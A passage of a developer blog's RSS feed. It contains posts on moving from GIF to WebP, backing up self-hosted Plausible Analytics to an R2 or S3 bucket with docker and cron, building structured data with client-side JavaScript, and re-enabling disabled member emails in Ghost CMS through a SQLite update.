widespread mobile connectivity, and the SEO implications, this is no trivial benefit.&lt;/p&gt;&lt;h2&gt;Still, Some Vehement Resistance &lt;/h2&gt;&lt;p&gt;Search for &quot;WebP&quot; on Reddit, and you&apos;re going to see a lot of this: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/08/image-2.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;788&quot; height=&quot;425&quot; /&gt;&lt;/figure&gt;&lt;p&gt;It&apos;s all over X too:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/08/image-1.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;618&quot; height=&quot;259&quot; /&gt;&lt;/figure&gt;&lt;p&gt;The nerds of the world might respect WebP for its technical advantages, but we&apos;re in a bubble. The rest of reality&lt;a href=&quot;https://imgur.com/gallery/image-webp-o6dMp92?ref=cms.macarthur.me&quot;&gt; vehemently hates it&lt;/a&gt;. That&apos;s largely because of compability issues with software that&apos;s &lt;em&gt;not&lt;/em&gt; the web. If you download an animated WebP in the Windows Photos app, for example, it won&apos;t play. You&apos;ll just get a still. Especially when the format was still relatively new, I could see that being pretty annoying if you&apos;re one to right-click + download lots of pictures from online.&lt;/p&gt;&lt;p&gt;But at this point, I suspect much of that hatred is riding the momentum of the cultural bandwagon. It&apos;s cool to hate on WebP, much like it is Bootstrap, Internet Explorer, or PHP. In addition to the fact that software is still rapidly moving to &lt;a href=&quot;https://en.wikipedia.org/wiki/WebP?ref=cms.macarthur.me#Graphics_software&quot;&gt;support animated WebPs&lt;/a&gt;, legitimate criticism is thin, at least for the vast majority of use cases on the web. &lt;/p&gt;&lt;h2&gt;Just Do It Already&lt;/h2&gt;&lt;p&gt;The reactionary defense of the GIF makes sense given the cultural role it&apos;s enjoyed. But the technical benefits alone are quickly eroding any effort to resist modern formats like WebP. &lt;/p&gt;&lt;p&gt;Particularly for the web, straight-up moving from GIF to WebP offers very few (if any) downsides. There&apos;s some work involved in manually converting images yourself, but solutions exist for automating the entire process as well – without even changing your image URLs (hard plug: &lt;a href=&quot;https://picperf.io/?ref=cms.macarthur.me&quot;&gt;consider PicPerf.io&lt;/a&gt;).&lt;/p&gt;&lt;p&gt;If you’re serving GIFs on your website, consider the move. For all the reasons mentioned here, may be well-worth the effort.&lt;/p&gt;</content:encoded></item><item><title>Exploring the Possibilities of Native JavaScript Decorators</title><link>https://macarthur.me/posts/approaches-to-memoizing-javascript-getters</link><guid isPermaLink="true">https://macarthur.me/posts/approaches-to-memoizing-javascript-getters</guid><pubDate>Fri, 09 Aug 2024 20:43:43 GMT</pubDate><content:encoded>&lt;figure&gt;&lt;a href=&quot;https://frontendmasters.com/blog/exploring-the-possibilities-of-native-javascript-decorators/?ref=cms.macarthur.me&quot;&gt;&lt;div&gt;&lt;div&gt;Exploring the Possibilities of Native JavaScript Decorators – Frontend Masters Boost&lt;/div&gt;&lt;div&gt;Native support for decorators is inevitable! It simplifies augmenting class methods, which can help with things like logging, memoization, debouncing, and dependency injection.&lt;/div&gt;&lt;div&gt;&lt;img src=&quot;https://frontendmasters.com/apple-touch-icon.png&quot; alt=&quot;&quot; /&gt;&lt;span&gt;Alex MacArthur&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;img src=&quot;https://frontendmasters.com/blog/wp-json/social-image-generator/v1/image/3381&quot; alt=&quot;&quot; /&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;</content:encoded></item><item><title>How to Back Up Self-Hosted Plausible Analytics Data to an R2 or S3 Bucket</title><link>https://macarthur.me/posts/back-up-plausible-to-bucket</link><guid isPermaLink="true">https://macarthur.me/posts/back-up-plausible-to-bucket</guid><pubDate>Mon, 29 Jul 2024 00:40:47 GMT</pubDate><content:encoded>&lt;p&gt;Self-hosting the Plausible Analytics &lt;a href=&quot;https://github.com/plausible/community-edition/?ref=cms.macarthur.me&quot;&gt;Community Edition&lt;/a&gt; is appealing for number of reasons, but it isn’t without drawbacks. Among the most obvious: no one’s gonna save you if your data is lost. And the impact of that risk only increases as the amount of data grows. &lt;/p&gt;&lt;p&gt;Fortunately, setting up an automated process for backing up that data to a remote location (like an S3 or R2 bucket) isn’t complex or expensive. Let’s walk it out with a simple, daily cron job. And, of course, we&apos;ll cover what it looks like to restore that remote data if it&apos;s ever needed.&lt;/p&gt;&lt;p&gt;I&apos;m assuming a couple of things here. Specifically, you&apos;re self-hosting on an Ubuntu machine, and you&apos;re using Plausible&apos;s &lt;a href=&quot;https://github.com/plausible/community-edition/blob/v2.1.1/docker-compose.yml?ref=cms.macarthur.me&quot;&gt;docker-compose.yml configuration&lt;/a&gt;. If those two things are true, this should all go pretty smoothly.&lt;/p&gt;&lt;h2&gt;S3 vs. R2?&lt;/h2&gt;&lt;p&gt;If you’re unfamiliar, a quick note about these bucket providers. Cloudflare’s alternative to S3 — R2 — touts an interchangeable API and a generous free tier. I’ll be using R2, but these steps will work for either provider. &lt;/p&gt;&lt;h2&gt;Make a Bucket&lt;/h2&gt;&lt;p&gt;I won’t go through those steps here — the processes are well-documented elsewhere, and will vary based on the provider you&apos;ve chosen. Here’s the R2 bucket I’ve made for myself:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/07/image.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1940&quot; height=&quot;1392&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/07/image.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/07/image.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2024/07/image.png 1600w, https://cms.macarthur.me/content/images/2024/07/image.png 1940w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Fresh, and ready to go.&lt;/p&gt;&lt;h2&gt;Configure the AWS CLI&lt;/h2&gt;&lt;p&gt;Next up, let&apos;s connect to our machine via SSH. We’ll need to configure the AWS CLI to be able to push and pull from that bucket we just created (this single CLI is compatible with both S3 and R2). Again, those steps are more thorougly documented elsewhere, but here’s the gist. &lt;/p&gt;&lt;p&gt;First, install the CLI And give it a minute to do its thing. It&apos;ll also require &lt;code&gt;unzip&lt;/code&gt; to be installed your machine. Lumping it all together, you&apos;ll need to run these commands: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Necessary for unzipping the installation package.
apt install unzip

# Download the installation package:
curl &quot;https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip&quot; -o &quot;awscliv2.zip&quot;

# Unzip it. 
unzip awscliv2.zip

# Install it. 
./aws/install&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, we need to fill our configuration file with a few key details – namely, an access key ID and secret access key. Since we&apos;re using Cloudflare, I&apos;ll get those by &lt;a href=&quot;https://developers.cloudflare.com/fundamentals/api/get-started/create-token/?ref=cms.macarthur.me&quot;&gt;generating an API token&lt;/a&gt;. Once you&apos;re done, you&apos;ll see something like this:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/07/Screen-Shot-2024-07-28-at-3.34.45-PM.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1486&quot; height=&quot;614&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/07/Screen-Shot-2024-07-28-at-3.34.45-PM.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/07/Screen-Shot-2024-07-28-at-3.34.45-PM.png 1000w, https://cms.macarthur.me/content/images/2024/07/Screen-Shot-2024-07-28-at-3.34.45-PM.png 1486w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Then, you&apos;re ready to finish configuring the CLI by creating a &lt;code&gt;~/.aws/credentials&lt;/code&gt; file containing this:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;[default]
aws_access_key_id = super-secret-access-key-id
aws_secret_access_key = super-secret-access-key
region = auto&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And with that, we have everything needed for automating our backups. &lt;/p&gt;&lt;h2&gt;Build a Backup Script &lt;/h2&gt;&lt;p&gt;With that foundation in place, let&apos;s start building a shell script that&apos;ll run every time we want to back up our data. It&apos;ll do the following:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;turn off running Docker containers&lt;/li&gt;&lt;li&gt;extract data from Docker volumes to files&lt;/li&gt;&lt;li&gt;upload those files to the bucket&lt;/li&gt;&lt;li&gt;reactivate the containers&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Let&apos;s stub this thing out. You can put it where you like, but I&apos;ll put mine at &lt;code&gt;~/backups/run.sh&lt;/code&gt;, and made it executable with &lt;code&gt;chmod +x ~/backups/run.sh&lt;/code&gt;.&lt;/p&gt;&lt;h3&gt;Extracting Data from Docker Volumes&lt;/h3&gt;&lt;p&gt;At this point, we&apos;ll be borrowing from the &lt;a href=&quot;https://plausiblebootstrapper.com/posts/back-up-plausible?ref=cms.macarthur.me&quot;&gt;backup guide laid out here&lt;/a&gt;. After disabling our containers, we&apos;ll use Jarek Lipski&apos;s &lt;a href=&quot;https://github.com/loomchild/volume-backup?ref=cms.macarthur.me&quot;&gt;volume-backup&lt;/a&gt; utility to pull data out of our Docker volumes, and save it all to respective files.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;#!/bin/bash bash

docker compose -f /path/to/plausible/directory/docker-compose.yml down

docker run -v plausible_db-data:/volume --rm --log-driver none loomchild/volume-backup backup &amp;gt; ~/backups/plausible_db-data.tar.bz2
docker run -v plausible_event-data:/volume --rm --log-driver none loomchild/volume-backup backup &amp;gt; ~/backups/plausible_event-data.tar.bz2
docker run -v plausible_event-logs:/volume --rm --log-driver none loomchild/volume-backup backup &amp;gt; ~/backups/plausible_event-logs.tar.bz2&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you&apos;d like to confirm the names of those volumes as you&apos;re setting this up, turn off your containers and see what pops up after running &lt;code&gt;docker volume ls -qf dangling=true&lt;/code&gt;. The human-readable names listed there are what you&apos;re looking for.&lt;/p&gt;&lt;h3&gt;Uploading to Remote Bucket&lt;/h3&gt;&lt;p&gt;Now that we have files, we can upload them to our remote bucket. But first, we need an endpoint URL, which varies based on whether you&apos;re using R2 or S3. &lt;/p&gt;&lt;ul&gt;&lt;li&gt;If you’re using S3, use the &lt;a href=&quot;https://docs.aws.amazon.com/general/latest/gr/s3.html?ref=cms.macarthur.me#s3_region&quot;&gt;endpoint based on your region listed here&lt;/a&gt;. For example, if you’re on &lt;code&gt;us-east-1&lt;/code&gt;, that value would be &lt;code&gt;s3.us-east-1.amazonaws.com&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;If you’re using R2 bucket, your URL endpoint will be &lt;code&gt;https://&amp;lt;ACCOUNT_ID&amp;gt;.r2.cloudflarestorage.com&lt;/code&gt;, &lt;a href=&quot;https://developers.cloudflare.com/r2/api/s3/api/?ref=cms.macarthur.me&quot;&gt;as indicated here&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;That value will then be used with the AWS CLI to upload our files:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;#!/bin/bash bash

# ...disable containers
# ...export volume data

aws s3 cp ~/backups/plausible_db-data.tar.bz2 s3://plausible-backups --endpoint-url https://ur-endpoint-url.com
aws s3 cp ~/backups/plausible_event-data.tar.bz2 s3://plausible-backups --endpoint-url https://ur-endpoint-url.com
aws s3 cp ~/backups/plausible_event-logs.tar.bz2 s3://plausible-backups --endpoint-url https://ur-endpoint-url.com&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And after it&apos;s finished, we can reactivate our containers: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;#!/bin/bash bash

# ...disable containers
# ...export volume data
# ...upload to remote bucket

docker compose -f ~/path/to/plausible/directory/docker-compose.yml up -d&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Go ahead and give it a spin by running &lt;code&gt;bash ~/backups/run.sh&lt;/code&gt;. After its completion, you&apos;ll see some contents in your bucket: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/07/image-5.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1756&quot; height=&quot;572&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/07/image-5.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/07/image-5.png 1000w, https://cms.macarthur.me/content/images/size/w1600/2024/07/image-5.png 1600w, https://cms.macarthur.me/content/images/2024/07/image-5.png 1756w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;That&apos;s the bulk of the work. Next up: automate it.&lt;/p&gt;&lt;h2&gt;Scheduling the Script&lt;/h2&gt;&lt;p&gt;If you don&apos;t already have it on your machine, install &lt;code&gt;cron&lt;/code&gt; by running &lt;code&gt;apt install cron&lt;/code&gt;. Then, open up the cron editor with &lt;code&gt;crontab -e&lt;/code&gt; and add the following line: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;0 2 * * * /bin/bash ~/backup/run.sh&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There&apos;s not much two it. At 2am every morning, it&apos;ll execute our script, uploading the latest data to our bucket. Done. &lt;/p&gt;&lt;h2&gt;Restoring the Data&lt;/h2&gt;&lt;p&gt;All of this is useless unless you can restore data when it’s needed. Here’s how that looks. Lipski&apos;s &lt;a href=&quot;https://github.com/loomchild/volume-backup?ref=cms.macarthur.me&quot;&gt;volume-backup&lt;/a&gt; utility also comes with a useful &lt;code&gt;restore&lt;/code&gt; command for injecting data back into a volume. All we need to do in preparation is to download it from our bucket and ensure our Docker containers are disabled: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;aws s3 cp s3://plausible-backups/plausible_db-data.tar.bz2 ~/backups --endpoint-url https://ur-endpoint-url.com
aws s3 cp s3://plausible-backups/plausible_event-data.tar.bz2 ~/backups --endpoint-url https://ur-endpoint-url.com
aws s3 cp s3://plausible-backups/plausible_event-logs.tar.bz2 ~/backups --endpoint-url https://ur-endpoint-url.com&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, it’s merely a matter of pumping those files into our volumes:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;docker run -i -v plausible_db-data:/volume --rm loomchild/volume-backup restore -f &amp;lt;~/backups/plausible_db-data.tar.bz2
docker run -i -v plausible_event-data:/volume --rm loomchild/volume-backup restore -f &amp;lt;~/backups/plausible_event-data.tar.bz2
docker run -i -v plausible_event-logs:/volume --rm loomchild/volume-backup restore -f &amp;lt;~/backups/plausible_event-logs.tar.bz2&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Restart those Docker containers and you&apos;ll be back up and running. &lt;/p&gt;&lt;h2&gt;Make It Yours&lt;/h2&gt;&lt;p&gt;It should go without saying, you&apos;re highly encouraged to make this your own and customize accordingly. If you come across some useful tips or modifications, definitely send them my way! This is the same process I use in the Plausible Bootstrapper&apos;s &lt;a href=&quot;https://plausiblebootstrapper.com/docs/backups?ref=cms.macarthur.me&quot;&gt;backup &amp;amp; restoration features&lt;/a&gt;, and I&apos;m eager to hear about anything that could make that experience even slicker. &lt;/p&gt;</content:encoded></item><item><title>On Building Structured Data with Client-Side JavaScript</title><link>https://macarthur.me/posts/structured-data-with-javascript</link><guid isPermaLink="true">https://macarthur.me/posts/structured-data-with-javascript</guid><pubDate>Sat, 27 Jul 2024 02:52:03 GMT</pubDate><content:encoded>&lt;p&gt;Web crawlers and client-side rendered applications (SPAs) have had a weird relationship for a while now. &lt;a href=&quot;https://developers.google.com/search/docs/crawling-indexing/javascript/javascript-seo-basics?ref=cms.macarthur.me&quot;&gt;Google has long said&lt;/a&gt; they’re able to crawl content built with JavaScript, but it’s still been &lt;a href=&quot;https://recoreo.com/blog/2021/02/single-page-apps-seo/?ref=cms.macarthur.me&quot;&gt;generally recommended&lt;/a&gt; that you server-render that content for maximum SEO benefit. &lt;/p&gt;&lt;p&gt;That’s always made sense. It’s more laborious for bots to crawl JS-rendered content, and as such, it can take longer to index. Plus, not all search engines say they crawl it in the same way Google does. Server-rendering&apos;s a safer bet.&lt;/p&gt;&lt;p&gt;With that in mind, I found it interesting to see Google be even &lt;em&gt;more&lt;/em&gt; insistent about their ability to parse structured data built with client-side JavaScript. They even have multiple resources on doing it too – like &lt;a href=&quot;https://developers.google.com/search/docs/appearance/structured-data/generate-structured-data-with-javascript?ref=cms.macarthur.me&quot;&gt;this page&lt;/a&gt; and &lt;a href=&quot;https://www.youtube.com/watch?v=hBKZnaIMm4M&amp;amp;ref=cms.macarthur.me&quot;&gt;this video&lt;/a&gt; with some pretty clear code snippets on the practice:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/07/image-2.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;1498&quot; height=&quot;900&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/07/image-2.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/07/image-2.png 1000w, https://cms.macarthur.me/content/images/2024/07/image-2.png 1498w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;I stumbled across all of this while building automated structured data support into &lt;a href=&quot;https://jamcomments.com/?ref=cms.macarthur.me&quot;&gt;JamComments&lt;/a&gt;, and knew it&apos;d inform the approach I took in designing how it worked. So, I had a vested interested in thinking about this a bit more.&lt;/p&gt;&lt;h2&gt;Who would care about this?&lt;/h2&gt;&lt;p&gt;A server-rendered approach is the best way to construct any of your content (including structured data), but I can see the usefulness in being able to inject it on the client. A few types of cases come to mind, including one I&apos;ve experienced personally.&lt;/p&gt;&lt;p&gt;First, love it or hate it, SPAs have become a normal part of the web. Many of them are both highly interactive SPAs &lt;em&gt;and&lt;/em&gt; content-heavy, with very good reason to want that content indexed. Twitter/X is a great example. You won&apos;t find the text of a tweet/post in the raw HTML source, but it&apos;ll still show up in &lt;a href=&quot;https://www.google.com/search?q=musk+coca+cola+tweet&amp;amp;sourceid=chrome&amp;amp;ie=UTF-8&amp;amp;ref=cms.macarthur.me&quot;&gt;search results&lt;/a&gt;. Being able to leverage structured data without a fundamental change in their rendering strategy is a no-brainer for these sites, especially when you see the numbers behind &lt;a href=&quot;https://jamcomments.com/posts/structured-data/?ref=cms.macarthur.me#the-growing-benefits-of-well-structured-data&quot;&gt;rich snippets&apos; effectiveness&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Second, the markup generated by content management systems (especially large ones with several parties editing manage content at once) can be rigid, difficult to customize, and slow to iterate on. This has incentivized creators to use tools like Google Tag Manager to inject or manipulate page content on their own terms (and caused many technical SEO specialists&apos; stress levels to spike). Despite the problems it often causes, it&apos;s hard to turn down that level of agency when it&apos;s right there in front of you.&lt;/p&gt;&lt;p&gt;Finally, there&apos;s a (maybe smaller) group out there who&apos;d like to &lt;em&gt;augment&lt;/em&gt; existing structured data with supplementary user-generated. But they either can&apos;t or prefer not to take over managing it completely. It&apos;s just easier &amp;amp; simpler to swoop in via client-side JavaScript. This is exactly where JamComments landed. When comments are left on a blog post, I wanted an out-of-the-box, non-invasive way to enhance the structured data already on the page. (Although, with &lt;a href=&quot;https://jamcomments.com/docs/structured-data/?ref=cms.macarthur.me&quot;&gt;a bit more configuration&lt;/a&gt;, you can have it all server-rendered too.)&lt;/p&gt;&lt;h2&gt;Are the drawbacks worth it?&lt;/h2&gt;&lt;p&gt;You guessed it: &quot;it depends.&quot; Two main considerations were swirling in my head while thinking through this. Fortunately, neither of them are deal-breakers. &lt;/p&gt;&lt;h3&gt;Slow Indexing&lt;/h3&gt;&lt;p&gt;To start, human-readable content constructed by JavaScript is slower to parse &amp;amp; index, and I&apos;m assuming processing structured data faces similar challenges. It&apos;s not something Google would like to admit, but you see &lt;a href=&quot;https://webmasters.stackexchange.com/questions/130430/is-server-side-rendering-a-must-have-for-good-seo-for-a-react-website/130884?ref=cms.macarthur.me#130884&quot;&gt;a good deal of that type of feedback&lt;/a&gt; scattered around the internet. &lt;a href=&quot;https://www.onely.com/blog/google-needs-9x-more-time-to-crawl-js-than-html/?ref=cms.macarthur.me&quot;&gt;This example&lt;/a&gt;, written just a couple of years ago, saw indexing take nearly &lt;em&gt;nine times longer&lt;/em&gt; for JavaScript-rendered content than server-rendered. That&apos;s not trivial. &lt;/p&gt;&lt;p&gt;Of course, two years is a big amount of internet time, and Google definitely has interest in speeding that problem up, so it&apos;s possible things are significantly quicker now. And on top of that, processing structured-data is &lt;em&gt;technically&lt;/em&gt; a different game with potentially different protocols. It&apos;s certainly something to keep in mind, but in my opinion, not a reason to avoid it altogether.&lt;/p&gt;&lt;h3&gt;Search Engine Crawler Support&lt;/h3&gt;&lt;p&gt;A common objection to client-side rendered content has been the belief that Google&apos;s the only player that can do it, and so you&apos;re leaving a lot of SEO chips on the table by neglecting other engines. But that&apos;s certainly changed over the years. &lt;/p&gt;&lt;p&gt;Bing states &lt;a href=&quot;https://www.bing.com/webmasters/help/webmaster-guidelines-30fba23a?ref=cms.macarthur.me&quot;&gt;they can do it as well&lt;/a&gt; (although, it does recommend a dynamic approach &lt;a href=&quot;https://blogs.bing.com/webmaster/october-2018/bingbot-Series-JavaScript,-Dynamic-Rendering,-and-Cloaking-Oh-My?ref=cms.macarthur.me&quot;&gt;based on user agent&lt;/a&gt;), and a number of other engines &lt;a href=&quot;https://prerender.io/blog/javascript-seo-for-bing-and-other-search-engines/?ref=cms.macarthur.me&quot;&gt;source their results from Bing&lt;/a&gt;. All that aside, Google itself still enjoys over &lt;a href=&quot;https://gs.statcounter.com/search-engine-market-share?ref=cms.macarthur.me&quot;&gt;91% of the market share&lt;/a&gt;, so you wouldn&apos;t be missing out on much anyway. And again, I can only see this concern becoming less real as time marches forward.&lt;/p&gt;&lt;p&gt;Like I said, no deal-breakers here. Just good ol&apos; tension to manage.&lt;/p&gt;&lt;h2&gt;So, now what? &lt;/h2&gt;&lt;p&gt;You might remember the battles we had years ago over whether a website &lt;em&gt;must&lt;/em&gt; work without JavaScript. In my opinion, proponents of progressive enhancement got overly idealistic, relegating sites that required JavaScript to having committed some low-level crime against humanity. &lt;/p&gt;&lt;p&gt;I think we&apos;ve touched some grass since then, realizing that expecting users to enable JavaScript on the web really isn&apos;t that much of an ask, and we&apos;re probably better off building websites assuming they always do. &lt;a href=&quot;https://syntax.fm/show/796/do-we-need-js-frameworks-are-you-over-engineering-webview-vs-native/transcript?ref=cms.macarthur.me#making-sites-work-without-javascript&quot;&gt;On Syntax&lt;/a&gt;, Wes Bos &amp;amp; Scott Tolinski recently touched on the idea of navigating the web without JavaScript enabled. I think they&apos;re right. A bit from that episode:&lt;/p&gt;&lt;blockquote&gt;I understand the whole idealistic concept behind it, and I realized we&apos;re probably loading a lot of JavaScript on the client, but, really, no one&apos;s doing that... People probably gonna get mad at me for that, but I don&apos;t I don&apos;t buy it. It&apos;s it&apos;s not gonna happen. - Scott Tolinski&lt;/blockquote&gt;&lt;p&gt;That&apos;s how I&apos;m coming to think of SEO and client-side rendering – including structured data generation. Yes, server-rendering everything is probably still the best SEO play. But you&apos;re not sinning if you don&apos;t, and you&apos;re not completely opting out of the SEO game either. Some zealot is probably gonna be torqued by your decision, but hopefully any drama that ensues will just fuel an insane amount of traffic to your site.&lt;/p&gt;&lt;p&gt;As with most decisions like this, the key thing is to use your brain. Consider your constraints &amp;amp; trade-offs, and make a decision. You&apos;ll be fine either way.&lt;/p&gt;</content:encoded></item><item><title>Control JavaScript Promises from Anywhere Using Promise.withResolvers()</title><link>https://macarthur.me/posts/promise-with-resolvers</link><guid isPermaLink="true">https://macarthur.me/posts/promise-with-resolvers</guid><pubDate>Sun, 09 Jun 2024 01:03:46 GMT</pubDate><content:encoded>&lt;figure&gt;&lt;a href=&quot;https://frontendmasters.com/blog/control-javascript-promises-from-anywhere-using-promise-withresolvers/?ref=cms.macarthur.me&quot;&gt;&lt;div&gt;&lt;div&gt;Control JavaScript Promises from Anywhere Using Promise.withResolvers() – Frontend Masters Boost&lt;/div&gt;&lt;div&gt;This method enhances flexibility by allowing promises to be resolved or rejected remotely, simplifying and streamlining asynchronous code.&lt;/div&gt;&lt;div&gt;&lt;img src=&quot;https://frontendmasters.com/apple-touch-icon.png&quot; alt=&quot;&quot; /&gt;&lt;span&gt;Alex MacArthur&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;img src=&quot;https://frontendmasters.com/blog/wp-json/social-image-generator/v1/image/2530&quot; alt=&quot;&quot; /&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;</content:encoded></item><item><title>Re-Enabling Emails for Ghost CMS Members</title><link>https://macarthur.me/posts/disabled-emails-in-ghost</link><guid isPermaLink="true">https://macarthur.me/posts/disabled-emails-in-ghost</guid><pubDate>Wed, 22 May 2024 03:11:07 GMT</pubDate><content:encoded>&lt;p&gt;This site&apos;s content lives in a headless instance of Ghost CMS hosted on &lt;a href=&quot;https://fly.io/?ref=cms.macarthur.me&quot;&gt;Fly.io&lt;/a&gt;. I&apos;ve been very happy with it for a &lt;a href=&quot;https://macarthur.me/posts/ghost-as-headless-cms/?ref=cms.macarthur.me&quot;&gt;number of reasons&lt;/a&gt;, two of which are its writing experience and built-in newsletter support. &lt;/p&gt;&lt;p&gt;But I hit an interesting issue after upgrading to a newer version of Ghost (from 5.36 to 5.82.2... it had been a while): &lt;strong&gt;I could suddenly only send emails to ~30% of my email list.&lt;/strong&gt; After digging into a few member records, I saw this: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/05/image-4.png&quot; alt=&quot;screenshot of &amp;quot;emailed disabled&amp;quot; banner&quot; loading=&quot;lazy&quot; width=&quot;1056&quot; height=&quot;374&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/05/image-4.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/05/image-4.png 1000w, https://cms.macarthur.me/content/images/2024/05/image-4.png 1056w&quot; /&gt;&lt;/figure&gt;&lt;p&gt;That led me to &lt;a href=&quot;https://ghost.org/help/disabled-emails/?ref=cms.macarthur.me#:~:text=Ghost%20helps%20to%20keep%20your,that%20account%20will%20be%20disabled.&quot;&gt;some documentation&lt;/a&gt; indicating that Ghost will automatically disable accounts it thinks can no longer receive emails. The problem was that, according to my metrics, &lt;strong&gt;several of my members had opened nearly &lt;em&gt;all&lt;/em&gt; of my emails.&lt;/strong&gt; Coupled with the fact that this issue only came up after upgrading, something didn&apos;t seem quite right. &lt;/p&gt;&lt;h2&gt;Some Light Digging&lt;/h2&gt;&lt;p&gt;I didn&apos;t do an extremely thorough investigation, but after crawling through Ghost&apos;s source a bit, I saw references to two events that are dispatched &amp;amp; handled in the application: &lt;code&gt;EmailBouncedEvent&lt;/code&gt; and &lt;code&gt;SpamComplaintEvent&lt;/code&gt;. Somewhere along the way, the &lt;code&gt;email_recipients&lt;/code&gt; table came up, which seems to serve as a logging mechanism for every email sent from Ghost (including when those emails fail). Also in this mix was the &lt;code&gt;MailgunEmailSuppressionList&lt;/code&gt;, which subscribed to those &lt;a href=&quot;https://github.com/TryGhost/Ghost/blame/7567997dbf6a0ae00aa0a88c466c1d0ee83a75bc/ghost/core/core/server/services/email-suppression-list/MailgunEmailSuppressionList.js?ref=cms.macarthur.me#L97&quot;&gt;aforementioned events&lt;/a&gt;: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;        const handleEvent = async (event) =&amp;gt; {
            try {
                await this.Suppression.add({
                    email_address: event.email,
                    email_id: event.emailId,
                    reason: &apos;bounce&apos;,
                    created_at: event.timestamp
                });
            } catch (err) {
                if (err.code !== &apos;ER_DUP_ENTRY&apos;) {
                    logging.error(err);
                }
            }
        };
        DomainEvents.subscribe(EmailBouncedEvent, handleEvent);
        DomainEvents.subscribe(SpamComplaintEvent, handleEvent);
    }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That was good enough for me to assume: &lt;em&gt;any email that had ever bounced was being suppressed.&lt;/em&gt; &lt;/p&gt;&lt;p&gt;That assumption got a bit stronger when a few more threads led to an &lt;a href=&quot;https://github.com/TryGhost/Ghost/commit/7bbf644d0d3aad42c5c4faaebe84a32986ae5f0c?ref=cms.macarthur.me&quot;&gt;email analytics service&lt;/a&gt;, which appears to have been added in a version of Ghost newer than the one I had been using. That service wires up a batch job pulling data from that &lt;code&gt;email_recipients&lt;/code&gt; table. Since none of the records in this table had ever been processed, it &lt;em&gt;looks&lt;/em&gt; like they were all processed at once, disabling a bunch of emails, and giving way to this &quot;sudden&quot; issue.&lt;/p&gt;&lt;h2&gt;The Fix (for now)&lt;/h2&gt;&lt;p&gt;After a little more snooping, I found that a member&apos;s email is disabled by setting the &lt;code&gt;email_disabled&lt;/code&gt; column on the &lt;code&gt;members&lt;/code&gt; table. This meant I&apos;d be able reenable emails for all of my members with a single query. Scary. I know. &lt;/p&gt;&lt;p&gt;I&apos;m using Sqlite, so after SSH-ing into my machine, it meant running these two commands: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;sqlite3 ghost.db&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;sqlite&amp;gt; UPDATE members SET email_disabled = 0;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The admin looked a little better after that, leaving those members all set to receive emails again. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2024/05/image-6.png&quot; alt=&quot;emails are re-enabled for user&quot; loading=&quot;lazy&quot; width=&quot;1058&quot; height=&quot;366&quot; srcset=&quot;https://cms.macarthur.me/content/images/size/w600/2024/05/image-6.png 600w, https://cms.macarthur.me/content/images/size/w1000/2024/05/image-6.png 1000w, https://cms.macarthur.me/content/images/2024/05/image-6.png 1058w&quot; 